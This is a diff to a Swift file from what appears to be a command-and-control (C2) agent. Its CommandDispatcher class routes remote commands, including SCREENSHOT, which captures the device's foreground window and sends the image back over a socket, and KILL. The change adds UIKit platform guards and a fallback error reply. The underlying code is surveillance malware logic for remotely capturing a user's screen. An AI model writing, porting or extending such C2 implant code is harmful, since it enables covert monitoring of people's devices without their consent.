@@ -1,5 +1,7 @@
 import Foundation
+#if canImport(UIKit)
 import UIKit
+#endif
 
 /// Routes C2 commands to the appropriate handler.
 public final class CommandDispatcher {
@@ -30,7 +32,7 @@ public final class CommandDispatcher {
             ])
 
         case "SCREENSHOT":
-            // iOS 17+: UIGraphicsImageRenderer on main thread.
+            #if canImport(UIKit)
             DispatchQueue.main.async { [weak self] in
                 guard let window = UIApplication.shared.connectedScenes
                     .compactMap({ $0 as? UIWindowScene }).first?.windows.first else { return }
@@ -44,6 +46,9 @@ public final class CommandDispatcher {
                     ])
                 }
             }
+            #else
+            socket?.send(type: "SCREENSHOT_RESULT", payload: ["error": "Screenshot not available on this platform"])
+            #endif
 
         case "KILL":
             socket?.send(type: "KILL_ACK", payload: [:])
